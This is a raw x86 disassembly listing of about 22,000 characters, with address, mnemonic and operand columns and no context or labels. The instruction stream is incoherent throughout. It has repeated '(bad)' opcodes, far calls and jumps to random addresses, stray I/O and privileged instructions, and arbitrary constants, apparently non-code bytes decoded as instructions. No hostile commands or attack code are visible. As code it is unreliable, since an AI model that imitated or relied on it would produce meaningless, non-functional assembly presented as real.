  41b395:	out    0xe4,al
  41b397:	mov    al,ds:0x4eeab5bc
  41b39c:	inc    edx
  41b39d:	mov    cs:0xcccea4e5,al
  41b3a3:	addr16 mov ss,ecx
  41b3a6:	repz repz push ds
  41b3a9:	jmp    0xfb75833a
  41b3ae:	push   esi
  41b3af:	popa   
  41b3b0:	scas   eax,DWORD PTR es:[edi]
  41b3b1:	jmp    0x2ee951cb
  41b3b6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b3b7:	outs   dx,BYTE PTR ds:[esi]
  41b3b8:	xchg   esi,eax
  41b3b9:	fld    st(5)
  41b3bb:	aas    
  41b3bc:	loope  0x41b3ed
  41b3be:	sub    cl,bh
  41b3c0:	daa    
  41b3c1:	push   es
  41b3c2:	inc    esp
  41b3c3:	imul   esi,DWORD PTR ds:[edx-0x2b],0xad2ad522
  41b3cb:	daa    
  41b3cc:	dec    esp
  41b3cd:	push   esp
  41b3ce:	sub    eax,0x3301aca
  41b3d3:	sub    edi,edx
  41b3d5:	inc    ebx
  41b3d6:	loope  0x41b40d
  41b3d8:	(bad)  
  41b3d9:	jmp    0x944f:0x3746161
  41b3e0:	sbb    DWORD PTR [edx+0x9],edx
  41b3e3:	pop    edx
  41b3e4:	mov    bl,0x3a
  41b3e6:	jmp    0x41b3bb
  41b3e8:	icebp  
  41b3e9:	add    eax,DWORD PTR [edi+0xe6d7f7c]
  41b3ef:	mov    al,BYTE PTR [edi+0x3a]
  41b3f2:	lods   al,BYTE PTR ds:[esi]
  41b3f3:	aas    
  41b3f4:	dec    eax
  41b3f5:	daa    
  41b3f6:	sahf   
  41b3f7:	std    
  41b3f8:	cwde   
  41b3f9:	test   al,0x9b
  41b3fb:	ret    0x9004
  41b3fe:	jl     0x41b447
  41b400:	iret   
  41b401:	mov    esp,0x4519c544
  41b406:	test   eax,0x3a359f61
  41b40b:	ds ss pop eax
  41b40e:	dec    edi
  41b40f:	in     al,dx
  41b410:	adc    BYTE PTR [ecx],0xd1
  41b413:	pop    ecx
  41b414:	push   edi
  41b415:	loope  0x41b449
  41b417:	add    DWORD PTR [ebp+0x20d513f],ebp
  41b41d:	xchg   ecx,eax
  41b41e:	test   esi,edi
  41b420:	sub    eax,0x750eeebb
  41b425:	sbb    dl,bh
  41b427:	mov    ch,0xc3
  41b429:	jnp    0x41b3bf
  41b42b:	call   0x92de949d
  41b430:	mov    edi,0x908971cc
  41b435:	jno    0x41b4a3
  41b437:	mov    ecx,0x48ff07be
  41b43c:	dec    ebp
  41b43d:	push   edx
  41b43e:	bound  ecx,QWORD PTR [ebx+0x1b739863]
  41b444:	sbb    BYTE PTR ds:0xf57b4a34,dh
  41b44a:	push   esp
  41b44b:	jnp    0x41b431
  41b44d:	rol    DWORD PTR [ecx+0x7a],0x37
  41b451:	call   0x8fd:0xdf630d34
  41b458:	pop    es
  41b459:	leave  
  41b45a:	and    ebp,edx
  41b45c:	outs   dx,BYTE PTR ds:[esi]
  41b45d:	mov    eax,0x73ac421
  41b462:	shl    al,cl
  41b464:	rol    bh,1
  41b466:	sub    al,0x3e
  41b468:	mov    ecx,0x1dac4384
  41b46d:	push   ebx
  41b46e:	mov    ebp,ebx
  41b470:	pop    ecx
  41b471:	not    DWORD PTR [ecx-0x4636bae4]
  41b477:	ror    BYTE PTR [edi-0x67a65094],0xd6
  41b47e:	js     0x41b474
  41b480:	mov    bh,0xe7
  41b482:	nop
  41b483:	mov    DWORD PTR [eax-0x1a],ecx
  41b486:	aas    
  41b487:	push   ds
  41b488:	popa   
  41b489:	inc    ecx
  41b48a:	or     esi,esp
  41b48c:	out    dx,eax
  41b48d:	repz loope 0x41b484
  41b490:	loope  0x41b4e1
  41b492:	js     0x41b4af
  41b494:	or     DWORD PTR [edx+edx*8+0x5f8f820],eax
  41b49b:	cmp    eax,0x3c229386
  41b4a0:	mov    eax,ecx
  41b4a2:	xor    eax,0xe07d0ce0
  41b4a7:	outs   dx,BYTE PTR ds:[esi]
  41b4a8:	out    0x9c,al
  41b4aa:	xor    al,0xe
  41b4ac:	in     eax,dx
  41b4ad:	into   
  41b4ae:	popa   
  41b4af:	adc    dh,BYTE PTR [edx]
  41b4b1:	pop    ecx
  41b4b2:	cmp    eax,0xdfc93118
  41b4b7:	imul   eax,DWORD PTR [edi+0x7f],0xffffffea
  41b4bb:	loopne 0x41b440
  41b4bd:	aas    
  41b4be:	and    cl,dh
  41b4c0:	mov    al,ds:0x606610df
  41b4c5:	sbb    BYTE PTR [edx+0xe],dh
  41b4c8:	add    DWORD PTR [ebp-0x71],ebp
  41b4cb:	outs   dx,DWORD PTR ds:[esi]
  41b4cc:	in     eax,0xb8
  41b4ce:	sbb    ch,BYTE PTR [edx-0x75]
  41b4d1:	ds (bad) 
  41b4d3:	nop    DWORD PTR [eax+0x24]
  41b4d7:	rcl    DWORD PTR [ecx-0x167a9063],0x21
  41b4de:	rcr    BYTE PTR [eax+0x4c],0xd3
  41b4e2:	mov    ds:0x845051d2,eax
  41b4e7:	cs gs popa 
  41b4ea:	lods   al,BYTE PTR ds:[esi]
  41b4eb:	add    bh,BYTE PTR [ecx+esi*2]
  41b4ee:	add    ebx,eax
  41b4f0:	and    BYTE PTR [ecx+ebx*1],al
  41b4f3:	and    ah,BYTE PTR [ecx]
  41b4f5:	xchg   edx,eax
  41b4f6:	mov    cs,WORD PTR [ecx+0x3]
  41b4f9:	fnstsw WORD PTR fs:[ecx+0x4f]
  41b4fd:	int    0x6b
  41b4ff:	sbb    ebx,DWORD PTR [ebx+eax*4]
  41b502:	inc    esp
  41b503:	sbb    BYTE PTR [esi+0x7641e0bf],bh
  41b509:	cdq    
  41b50a:	sbb    DWORD PTR [ebp+0x4dafc3f8],eax
  41b510:	pusha  
  41b511:	icebp  
  41b512:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b513:	call   0x8800263d
  41b518:	fld    QWORD PTR [eax]
  41b51a:	(bad)  
  41b51c:	push   esp
  41b51d:	lods   eax,DWORD PTR ds:[esi]
  41b51e:	adc    eax,0x7c4e8922
  41b523:	mov    edx,0x438d010b
  41b528:	adc    ebx,DWORD PTR [ecx]
  41b52a:	aas    
  41b52b:	xor    dh,BYTE PTR [ecx]
  41b52d:	popa   
  41b52e:	loop   0x41b5a8
  41b530:	into   
  41b531:	idiv   DWORD PTR [edx]
  41b533:	pop    ecx
  41b534:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b535:	imul   esi,DWORD PTR [edi+0x3b57ee95],0xffffffae
  41b53c:	jle    0x41b5a5
  41b53e:	popa   
  41b53f:	in     eax,0x8c
  41b541:	or     eax,0x63c68652
  41b546:	mov    DWORD PTR [ecx-0xa9f45f4],edx
  41b54c:	cs lahf 
  41b54e:	(bad)  
  41b54f:	call   0xf4f31401
  41b554:	or     ecx,ebx
  41b556:	mov    BYTE PTR [esi-0x4ea44361],0xa0
  41b55d:	sub    BYTE PTR [esi-0x2b],0xd
  41b561:	pop    esp
  41b562:	mov    eax,0x4347601
  41b567:	std    
  41b568:	lock fwait
  41b56a:	clc    
  41b56b:	cs ror esi,1
  41b56e:	in     eax,dx
  41b56f:	jne    0x41b542
  41b571:	fild   DWORD PTR [ecx+eiz*8]
  41b574:	mov    ah,0x82
  41b576:	bound  ecx,QWORD PTR [eax+0x50]
  41b579:	dec    edi
  41b57a:	call   0xbf9b:0xe1ac1126
  41b581:	jne    0x41b5e0
  41b583:	xchg   edx,eax
  41b584:	js     0x41b5ab
  41b586:	dec    ecx
  41b587:	imul   esp,DWORD PTR [ebp+0x66],0xf3917ec1
  41b58e:	adc    edi,eax
  41b590:	jae    0x41b55a
  41b592:	aaa    
  41b593:	scas   al,BYTE PTR es:[edi]
  41b594:	add    BYTE PTR [edx+eiz*2+0x37],dl
  41b598:	mov    ebp,0x226f0f0f
  41b59d:	call   0xeb05:0x3eda979f
  41b5a4:	ss enter 0x4075,0x9a
  41b5a9:	mov    gs,WORD PTR [esi]
  41b5ab:	and    al,0x7c
  41b5ad:	ja     0x41b5d6
  41b5af:	ret    0x46b5
  41b5b2:	out    dx,eax
  41b5b3:	or     al,0xfe
  41b5b5:	xchg   ebx,eax
  41b5b6:	push   0x24
  41b5b8:	jl     0x41b5a3
  41b5ba:	mov    dl,0x17
  41b5bc:	mov    DWORD PTR [ecx-0x21],eax
  41b5bf:	xor    al,BYTE PTR [edi+0x74bd6406]
  41b5c5:	fsub   QWORD PTR [eax+0x796827f3]
  41b5cb:	adc    eax,DWORD PTR [ebx+0x50]
  41b5ce:	outs   dx,BYTE PTR ds:[esi]
  41b5cf:	mov    DWORD PTR [edi-0x5722d1ae],eax
  41b5d5:	and    eax,0x6dafd031
  41b5da:	stc    
  41b5db:	aad    0x4f
  41b5dd:	out    dx,eax
  41b5de:	cmp    al,0x7d
  41b5e0:	ret    
  41b5e1:	dec    edx
  41b5e2:	add    ecx,DWORD PTR [eax-0x58]
  41b5e5:	sub    eax,DWORD PTR [ebx]
  41b5e7:	mov    esp,DWORD PTR [eax]
  41b5e9:	aam    0xab
  41b5eb:	mov    ebx,0x4a02d4de
  41b5f0:	jl     0x41b5d7
  41b5f2:	dec    esp
  41b5f3:	sub    BYTE PTR [edi+0x45],0xb2
  41b5f7:	or     BYTE PTR [ebx],bh
  41b5f9:	sub    dl,BYTE PTR [ecx-0xed6b624]
  41b5ff:	inc    esi
  41b600:	or     eax,ebp
  41b602:	nop
  41b603:	icebp  
  41b604:	jb     0x41b604
  41b606:	xchg   edx,eax
  41b607:	test   al,0x9f
  41b609:	outs   dx,BYTE PTR ds:[esi]
  41b60a:	cwde   
  41b60b:	daa    
  41b60c:	and    DWORD PTR [esi],0x2a43c807
  41b612:	mov    ax,ds:0x6af26ca3
  41b618:	lea    ebp,[ecx+0x328cd0a9]
  41b61e:	outs   dx,DWORD PTR ds:[esi]
  41b61f:	mov    edi,0x5da8cfbe
  41b624:	add    bh,BYTE PTR [eax-0x6b]
  41b627:	add    edx,ebp
  41b629:	mov    ?,WORD PTR [esi-0x6ec8900d]
  41b62f:	pop    ebp
  41b630:	push   eax
  41b631:	jp     0x41b5fe
  41b633:	adc    DWORD PTR [ecx-0x6f],edi
  41b636:	imul   ebx,DWORD PTR [edi-0x41b5844b],0xffffffeb
  41b63d:	cmp    al,0xdb
  41b63f:	pushf  
  41b640:	push   0x17a8840
  41b645:	adc    DWORD PTR [edx-0xf],0x4c56477
  41b64c:	icebp  
  41b64d:	inc    ebx
  41b64f:	rcl    DWORD PTR [esi-0x6e],cl
  41b652:	push   ecx
  41b653:	(bad)  
  41b654:	mov    edi,0x38ec9ed1
  41b659:	adc    al,0x1f
  41b65b:	mov    esp,0xe5aaecd0
  41b660:	inc    eax
  41b661:	push   ecx
  41b663:	int    0x13
  41b665:	call   0x5da02d91
  41b66a:	(bad)  
  41b66c:	jge    0x41b660
  41b66e:	push   esi
  41b66f:	int3   
  41b670:	jnp    0x41b607
  41b672:	adc    DWORD PTR [edi-0x7c],0xff74a25d
  41b679:	add    eax,ebp
  41b67b:	(bad)  
  41b67c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b67d:	fpatan 
  41b67f:	loop   0x41b6ac
  41b681:	adc    al,0x95
  41b683:	cwde   
  41b684:	je     0x41b6c7
  41b686:	cs loope 0x41b674
  41b689:	inc    esi
  41b68a:	inc    eax
  41b68b:	test   al,0xf3
  41b68d:	pop    esi
  41b68e:	int3   
  41b68f:	push   ebx
  41b690:	(bad)  
  41b691:	outs   dx,DWORD PTR ds:[esi]
  41b692:	bound  ebx,QWORD PTR [ebx+0x4b]
  41b695:	xchg   edi,eax
  41b696:	jecxz  0x41b63e
  41b698:	push   edx
  41b699:	jbe    0x41b61d
  41b69b:	inc    ecx
  41b69c:	jns    0x41b66d
  41b69e:	js     0x41b627
  41b6a0:	shl    DWORD PTR [ecx-0x7b],cl
  41b6a3:	dec    edi
  41b6a4:	pop    edx
  41b6a5:	jae    0x41b66c
  41b6a7:	in     al,0x8b
  41b6a9:	mov    cl,0x84
  41b6ab:	popf   
  41b6ac:	ja     0x41b6dc
  41b6ae:	cmc    
  41b6af:	icebp  
  41b6b0:	pop    ebp
  41b6b1:	jne    0x41b699
  41b6b3:	(bad)  
  41b6b5:	mov    eax,ds:0x8fe8fa3a
  41b6ba:	inc    esp
  41b6bb:	dec    ebp
  41b6bc:	call   0x4f52:0x3b9561ba
  41b6c3:	test   DWORD PTR [edi+0x707c7673],ebx
  41b6c9:	retf   
  41b6ca:	xchg   esi,eax
  41b6cb:	jmp    0x41b6c8
  41b6cd:	sahf   
  41b6ce:	push   ss
  41b6cf:	lahf   
  41b6d0:	pop    ebp
  41b6d1:	inc    ecx
  41b6d2:	mov    edx,0x28275660
  41b6d7:	data16 cs xor BYTE PTR fs:[ebx],cl
  41b6dc:	sub    eax,0x1390d268
  41b6e1:	stos   BYTE PTR es:[edi],al
  41b6e2:	scas   eax,DWORD PTR es:[edi]
  41b6e3:	inc    ebx
  41b6e4:	and    DWORD PTR [ebp+0x9],ebx
  41b6e7:	push   ebx
  41b6e8:	popa   
  41b6e9:	jo     0x41b6b1
  41b6eb:	xchg   BYTE PTR [eax-0x20],dh
  41b6ee:	cdq    
  41b6ef:	mov    bh,0xd2
  41b6f1:	jnp    0x41b677
  41b6f3:	xchg   edx,eax
  41b6f4:	sub    ch,BYTE PTR [ebx-0x7f81406a]
  41b6fa:	sub    DWORD PTR [eax],edx
  41b6fc:	jmp    0xd2b7:0x86d2593d
  41b703:	push   ebx
  41b704:	enter  0xea32,0x4e
  41b708:	jne    0x41b6c6
  41b70a:	and    BYTE PTR [ecx-0x4c],cl
  41b70d:	dec    ecx
  41b70e:	pop    es
  41b70f:	mov    ah,0x8b
  41b711:	jge    0x41b6a2
  41b713:	mov    DWORD PTR [edi],ecx
  41b715:	jb     0x41b73e
  41b717:	mov    eax,ds:0x18a00b4d
  41b71c:	in     eax,dx
  41b71d:	enter  0x5e33,0x34
  41b721:	xlat   BYTE PTR ds:[ebx]
  41b722:	or     ah,BYTE PTR [ecx]
  41b724:	sbb    eax,DWORD PTR [edi]
  41b726:	jb     0x41b6c3
  41b728:	cmp    ebp,esp
  41b72a:	jnp    0x41b77c
  41b72c:	inc    edx
  41b72d:	xchg   BYTE PTR [ebp+eax*8+0x69269588],ah
  41b734:	pop    ecx
  41b735:	inc    ebx
  41b736:	mov    ecx,0x8a356dee
  41b73b:	sbb    edi,edx
  41b73d:	outs   dx,DWORD PTR ds:[esi]
  41b73e:	mov    al,0xa9
  41b740:	mov    al,0x55
  41b742:	push   0x8a321bcd
  41b747:	out    dx,al
  41b748:	scas   al,BYTE PTR es:[edi]
  41b749:	pop    es
  41b74a:	dec    edi
  41b74b:	push   ebp
  41b74c:	or     eax,0x2f655af6
  41b751:	pop    ss
  41b752:	pop    esi
  41b753:	cmp    BYTE PTR [esi+eiz*8],0x6b
  41b757:	xchg   esp,eax
  41b758:	or     cl,BYTE PTR [edi-0x6a234723]
  41b75e:	mov    ds,WORD PTR [edx+0x4]
  41b761:	pop    esp
  41b762:	add    DWORD PTR [edx+0x40d1eb0e],0xf73173e9
  41b76c:	xor    eax,0x5ca90768
  41b771:	xchg   edx,eax
  41b772:	(bad)  
  41b773:	mov    cl,0x13
  41b775:	jne    0x41b749
  41b777:	xchg   ecx,eax
  41b778:	mov    esi,0xc95e5bf0
  41b77d:	or     al,0x49
  41b77f:	jne    0x41b72a
  41b781:	mov    edi,0xc6c4873d
  41b786:	mov    eax,0xf90b11a3
  41b78b:	outs   dx,DWORD PTR ds:[esi]
  41b78c:	dec    ebp
  41b78d:	out    dx,eax
  41b78e:	and    cl,ch
  41b790:	and    al,0x16
  41b792:	mov    eax,0x3dd8db33
  41b797:	and    ebp,DWORD PTR [ecx+0x60]
  41b79a:	push   cs
  41b79b:	and    al,0x68
  41b79d:	xor    ecx,DWORD PTR [esi+0xc]
  41b7a0:	gs ins DWORD PTR es:[edi],dx
  41b7a2:	adc    al,0x3e
  41b7a4:	xor    DWORD PTR ds:0xc75f6a27,edx
  41b7aa:	jg     0x41b7b4
  41b7ac:	xor    DWORD PTR [edi+0x64],esi
  41b7af:	lods   eax,DWORD PTR ds:[esi]
  41b7b0:	lods   al,BYTE PTR ds:[esi]
  41b7b1:	jns    0x41b771
  41b7b3:	xor    al,0x4
  41b7b5:	mov    bl,0xbe
  41b7b7:	leave  
  41b7b8:	sar    BYTE PTR [ebx-0x6d4fdce9],1
  41b7be:	dec    ebx
  41b7bf:	iret   
  41b7c0:	cmp    eax,0xcc285d8c
  41b7c5:	test   ebp,ecx
  41b7c7:	imul   BYTE PTR [eax+0x25cf01df]
  41b7cd:	retf   
  41b7ce:	xchg   esp,eax
  41b7cf:	and    DWORD PTR [edx-0x2831138d],ecx
  41b7d5:	ret    0x26c8
  41b7d8:	mov    eax,ds:0x3bb38fb7
  41b7dd:	(bad)  
  41b7de:	stos   BYTE PTR es:[edi],al
  41b7df:	inc    ecx
  41b7e0:	jns    0x41b791
  41b7e2:	clc    
  41b7e3:	je     0x41b7f9
  41b7e5:	push   esp
  41b7e6:	std    
  41b7e7:	enter  0xa585,0xe2
  41b7eb:	nop
  41b7ec:	mov    al,ds:0x4d7c824b
  41b7f1:	jmp    0x41b83d
  41b7f3:	out    dx,eax
  41b7f4:	icebp  
  41b7f5:	and    BYTE PTR ds:0x9627cd64,0x55
  41b7fc:	xor    DWORD PTR [ebx],edx
  41b7fe:	jmp    FWORD PTR [edx+esi*1-0x36]
  41b802:	mov    esi,0xe6803358
  41b807:	sbb    eax,0xb0339402
  41b80c:	loope  0x41b7ea
  41b80e:	push   ss
  41b80f:	or     DWORD PTR [eax+0x52d9eba0],eax
  41b815:	mov    dl,0xde
  41b817:	cmp    esi,DWORD PTR [ebx+0x1728767d]
  41b81d:	add    eax,edx
  41b81f:	pop    ss
  41b820:	push   ebp
  41b821:	call   0x40d:0x2a06ae44
  41b828:	mov    al,0x9a
  41b82a:	retf   
  41b82b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b82c:	ja     0x41b89a
  41b82e:	jge    0x41b7cf
  41b830:	and    eax,0x52a253ee
  41b835:	in     eax,0xb4
  41b837:	pop    esp
  41b838:	dec    ecx
  41b839:	fwait
  41b83a:	jge    0x41b7d2
  41b83c:	jbe    0x41b880
  41b83e:	ss jne 0x41b7e1
  41b841:	outs   dx,BYTE PTR ds:[esi]
  41b842:	jle    0x41b7c7
  41b844:	cmp    dl,BYTE PTR [ebp+0x2c7f3ab6]
  41b84a:	push   ds
  41b84b:	out    dx,al
  41b84c:	xchg   BYTE PTR [eax+esi*2-0x55],bh
  41b850:	mov    cl,0x51
  41b852:	hlt    
  41b853:	aam    0x18
  41b855:	mov    ch,0x94
  41b857:	push   0x168f3aef
  41b85c:	out    dx,eax
  41b85d:	xlat   BYTE PTR ds:[ebx]
  41b85e:	jo     0x41b8a6
  41b860:	fiadd  WORD PTR [ebp+0x65]
  41b863:	repz call DWORD PTR [eax-0x7c]
  41b867:	test   BYTE PTR [ebx],bl
  41b869:	sub    ebp,esp
  41b86b:	int3   
  41b86c:	fsubr  QWORD PTR [edx]
  41b86e:	out    0x95,eax
  41b870:	sub    dl,0xf8
  41b873:	dec    esp
  41b874:	lock mov al,0x27
  41b877:	test   BYTE PTR [edx*1+0x6a51a255],ch
  41b87e:	inc    eax
  41b87f:	xlat   BYTE PTR ds:[ebx]
  41b880:	xlat   BYTE PTR ds:[ebx]
  41b881:	jns    0x41b8b0
  41b883:	sub    eax,0xaef6cad6
  41b888:	jp     0x41b8c4
  41b88a:	repnz or DWORD PTR [eax+ecx*4-0x37],ebp
  41b88f:	mov    BYTE PTR [ecx-0x4c],bh
  41b892:	rcr    ebp,cl
  41b894:	rcr    BYTE PTR [ecx+0x47ec86c0],1
  41b89a:	mov    esp,0x95912f79
  41b89f:	pop    eax
  41b8a0:	loopne 0x41b830
  41b8a2:	sbb    BYTE PTR [edx+0x26],ah
  41b8a5:	cwde   
  41b8a6:	fcom   QWORD PTR [ebp+0xb930241]
  41b8ac:	leave  
  41b8ad:	ins    BYTE PTR es:[edi],dx
  41b8ae:	xor    DWORD PTR [ecx],edi
  41b8b0:	mov    BYTE PTR [esp+edx*8-0x75],bl
  41b8b4:	sub    al,0xf0
  41b8b6:	push   ecx
  41b8b7:	fstp   DWORD PTR [edx]
  41b8b9:	xchg   edi,eax
  41b8ba:	sar    DWORD PTR [edi],cl
  41b8bc:	xchg   esi,eax
  41b8bd:	jne    0x41b8c5
  41b8bf:	inc    edx
  41b8c0:	adc    DWORD PTR [eax+0x43],ebp
  41b8c3:	xchg   edx,eax
  41b8c4:	repnz push edx
  41b8c6:	icebp  
  41b8c7:	jbe    0x41b88e
  41b8c9:	jg     0x41b8a1
  41b8cb:	int3   
  41b8cc:	test   BYTE PTR ss:[ebx-0x4b22dc10],0x64
  41b8d4:	fld    QWORD PTR [ecx]
  41b8d6:	das    
  41b8d7:	push   esp
  41b8d8:	int3   
  41b8d9:	adc    eax,0xf6de39d5
  41b8de:	sbb    al,0x26
  41b8e0:	retf   0xa591
  41b8e3:	fld    DWORD PTR [edx]
  41b8e5:	retf   
  41b8e6:	cwde   
  41b8e7:	or     bl,ch
  41b8e9:	call   0x165dd22e
  41b8ee:	dec    ecx
  41b8ef:	imul   eax,DWORD PTR [ecx],0x9327c2db
  41b8f5:	pop    ds
  41b8f6:	gs push es
  41b8f8:	push   eax
  41b8f9:	mov    esi,0xd012aadf
  41b8fe:	imul   ebp,DWORD PTR [ebp+0x3d469359],0xfffffffe
  41b905:	shr    DWORD PTR [esi+0x21],1
  41b908:	cmp    BYTE PTR [esi],al
  41b90a:	(bad)  
  41b90b:	mov    edi,0x43f57775
  41b910:	or     cl,BYTE PTR [edi+0x15e51da8]
  41b916:	loop   0x41b8e0
  41b918:	or     al,0x27
  41b91a:	ins    DWORD PTR es:[edi],dx
  41b91b:	call   0xb952c39b
  41b920:	loop   0x41b908
  41b922:	lods   eax,DWORD PTR ds:[esi]
  41b923:	nop
  41b924:	push   edx
  41b925:	adc    edx,DWORD PTR [edi+ebx*8+0x948228c]
  41b92c:	(bad)  
  41b92d:	cmp    eax,0xf1a859d5
  41b932:	sbb    DWORD PTR [esp+esi*2+0x231d1251],esi
  41b939:	sub    al,0x38
  41b93b:	nop
  41b93c:	imul   edx,DWORD PTR [esi-0x606cf192],0x4a1d8cc
  41b946:	or     BYTE PTR [ebp+0x3def20b6],ch
  41b94c:	xor    BYTE PTR [edx-0x7bbc6ce9],ah
  41b952:	add    bh,BYTE PTR [eax+0x26]
  41b955:	hlt    
  41b956:	div    BYTE PTR [ecx]
  41b958:	jg     0x41b903
  41b95a:	inc    esp
  41b95b:	add    esp,DWORD PTR [esi-0x487f84fc]
  41b961:	retf   0xa8e7
  41b964:	sub    edi,DWORD PTR [esi-0x4e9a1869]
  41b96a:	popa   
  41b96b:	sbb    eax,0xe1642b87
  41b970:	push   edx
  41b971:	push   edi
  41b972:	xor    al,0x53
  41b974:	or     BYTE PTR [ebx+0xe],ah
  41b977:	adc    al,0x77
  41b979:	xchg   edi,eax
  41b97a:	inc    esp
  41b97b:	pop    ebx
  41b97d:	cmc    
  41b97e:	jle    0x41b9f5
  41b980:	hlt    
  41b981:	cdq    
  41b982:	cmp    DWORD PTR [edx-0x61d8ffef],0xd4333588
  41b98c:	in     eax,dx
  41b98d:	xchg   edi,eax
  41b98e:	cdq    
  41b98f:	or     BYTE PTR [ebx+0x73],al
  41b992:	out    0xa3,al
  41b994:	xchg   ebp,eax
  41b995:	rcr    ch,cl
  41b997:	rcl    DWORD PTR [ecx],1
  41b999:	rcr    ecx,0xe2
  41b99c:	daa    
  41b99d:	stos   BYTE PTR es:[edi],al
  41b99e:	enter  0xd1c3,0x62
  41b9a2:	push   ebp
  41b9a3:	add    al,0x8a
  41b9a5:	gs add al,0xe0
  41b9a8:	out    0xe7,eax
  41b9aa:	mov    WORD PTR [ebx+eiz*8],gs
  41b9ad:	mov    ah,ch
  41b9af:	sub    al,0x38
  41b9b1:	gs add eax,0x8afbd525
  41b9b7:	shl    DWORD PTR [edx],0x42
  41b9ba:	cdq    
  41b9bb:	in     ax,dx
  41b9bd:	mov    esp,0x792f3803
  41b9c2:	sub    cl,BYTE PTR [eax]
  41b9c4:	int3   
  41b9c5:	adc    eax,0xfb146bb0
  41b9ca:	std    
  41b9cb:	out    0x48,al
  41b9cd:	outs   dx,BYTE PTR ds:[esi]
  41b9ce:	jmp    0x41ba44
  41b9d0:	(bad)  
  41b9d1:	fstp   DWORD PTR [ecx]
  41b9d3:	aam    0x35
  41b9d5:	pop    ebx
  41b9d6:	mov    ds:0x8a3c37bc,al
  41b9db:	in     al,0xe1
  41b9dd:	or     BYTE PTR [eax+esi*8-0x3c92cf99],dl
  41b9e4:	scas   al,BYTE PTR es:[edi]
  41b9e5:	stos   DWORD PTR es:[edi],eax
  41b9e6:	inc    ecx
  41b9e7:	mov    edx,0x9e85bc81
  41b9ec:	in     eax,0x5
  41b9ee:	in     al,dx
  41b9ef:	sahf   
  41b9f0:	pop    eax
  41b9f1:	jp     0x41ba0d
  41b9f3:	imul   ebp,ebp,0x8d7c9f19
  41b9f9:	xor    ch,0x3e
  41b9fc:	ficom  WORD PTR cs:[ecx]
  41b9ff:	mov    esp,0xb1b619af
  41ba04:	add    BYTE PTR [ebx+0x8bcc90d],ch
  41ba0a:	popa   
  41ba0b:	scas   al,BYTE PTR es:[edi]
  41ba0c:	test   BYTE PTR [ebx],ah
  41ba0e:	cs jge 0x41ba47
  41ba11:	repnz xchg ecx,eax
  41ba13:	ins    DWORD PTR es:[edi],dx
  41ba14:	in     al,dx
  41ba15:	in     eax,0xdc
  41ba17:	lahf   
  41ba18:	bound  ebx,QWORD PTR [eax]
  41ba1a:	pop    esp
  41ba1b:	cmp    esp,DWORD PTR [esi-0x26b0d834]
  41ba21:	out    dx,al
  41ba22:	fs adc eax,0x325afe77
  41ba28:	lea    esi,[edx]
  41ba2a:	es repnz push edx
  41ba2d:	pop    eax
  41ba2e:	fiadd  WORD PTR [edi+0x19]
  41ba31:	sbb    DWORD PTR [ebx+ebx*4-0x5b],esp
  41ba35:	sbb    BYTE PTR [esi+0x36724282],0x70
  41ba3c:	xchg   ebp,eax
  41ba3d:	lock or edx,esi
  41ba40:	rol    BYTE PTR [ebx],1
  41ba42:	sub    ebx,esp
  41ba44:	sub    DWORD PTR [esi],ebp
  41ba46:	cmp    esi,DWORD PTR [eax+eiz*4+0x310c53e2]
  41ba4d:	jae    0x41b9e3
  41ba4f:	dec    edx
  41ba50:	add    eax,0xf6d6d844
  41ba55:	jnp    0x41baae
  41ba57:	push   ecx
  41ba58:	into   
  41ba59:	jecxz  0x41bada
  41ba5b:	jbe    0x41b9e3
  41ba5d:	pop    ecx
  41ba5e:	clc    
  41ba5f:	outs   dx,DWORD PTR ds:[esi]
  41ba60:	fcom   DWORD PTR [edx-0x38]
  41ba63:	scas   eax,DWORD PTR es:[edi]
  41ba64:	leave  
  41ba65:	or     ebp,esp
  41ba67:	lds    esi,FWORD PTR [esi]
  41ba69:	(bad)  
  41ba6a:	retf   0x52e1
  41ba6d:	xor    BYTE PTR [edx*2+0x1678ebdf],ch
  41ba74:	lock iret 
  41ba76:	or     DWORD PTR [ebx+0x36],eax
  41ba79:	xchg   ebp,eax
  41ba7a:	and    dh,dh
  41ba7c:	jnp    0x41ba74
  41ba7e:	cmp    ebx,DWORD PTR [ebx+0x7f6fcd0e]
  41ba84:	outs   dx,DWORD PTR ds:[esi]
  41ba85:	out    dx,al
  41ba86:	inc    ebp
  41ba87:	xchg   edi,eax
  41ba88:	shr    DWORD PTR [ebx-0x10e3e07a],0xe
  41ba8f:	shl    DWORD PTR [esp+esi*2+0x72],cl
  41ba93:	and    cl,BYTE PTR ds:0x8c10dcb2
  41ba99:	mov    cl,0x55
  41ba9b:	call   0x8435:0xb164d349
  41baa2:	lds    edx,FWORD PTR [eax-0x5a7803b6]
  41baa8:	sub    eax,ebp
  41baaa:	stc    
  41baab:	add    edx,DWORD PTR [edx+0x1e7e3ba0]
  41bab1:	dec    esp
  41bab2:	push   eax
  41bab3:	xchg   ebp,eax
  41bab4:	jae    0x41bab5
  41bab6:	jnp    0x41ba90
  41bab8:	ins    DWORD PTR es:[edi],dx
  41bab9:	lods   al,BYTE PTR ds:[esi]
  41baba:	fdivrp st(2),st
  41babc:	push   edi
  41babd:	rol    BYTE PTR [edi-0x127db2ea],0xb4
  41bac4:	add    bh,bh
  41bac6:	jns    0x41bab6
  41bac8:	out    dx,eax
  41bac9:	mov    cs,ebx
  41bacb:	outs   dx,BYTE PTR ds:[esi]
  41bacc:	add    al,0x31
  41bace:	cwde   
  41bacf:	je     0x41bace
  41bad1:	and    al,0x7f
  41bad3:	sbb    dh,BYTE PTR [edx+0x11075397]
  41bad9:	cmp    eax,0x15078181
  41bade:	retf   
  41badf:	xor    esi,eax
  41bae1:	jmp    0x41ba7e
  41bae3:	in     al,0xd7
  41bae5:	out    dx,al
  41bae6:	lea    ebp,[edx-0x19]
  41bae9:	(bad)  
  41baea:	call   0x38b2a772
  41baef:	dec    si
  41baf1:	fbld   TBYTE PTR [esp+edx*8-0x18]
  41baf5:	fs stos DWORD PTR es:[edi],eax
  41baf7:	sti    
  41baf8:	and    BYTE PTR [eax+0xab19e9e],cl
  41bafe:	sbb    dh,BYTE PTR [ecx+0x58]
  41bb01:	mov    ebp,0xe5974a88
  41bb06:	es (bad) 
  41bb08:	je     0x41baac
  41bb0a:	sub    BYTE PTR [ecx-0x73],cl
  41bb0d:	push   edx
  41bb0e:	aas    
  41bb0f:	push   es
  41bb10:	cld    
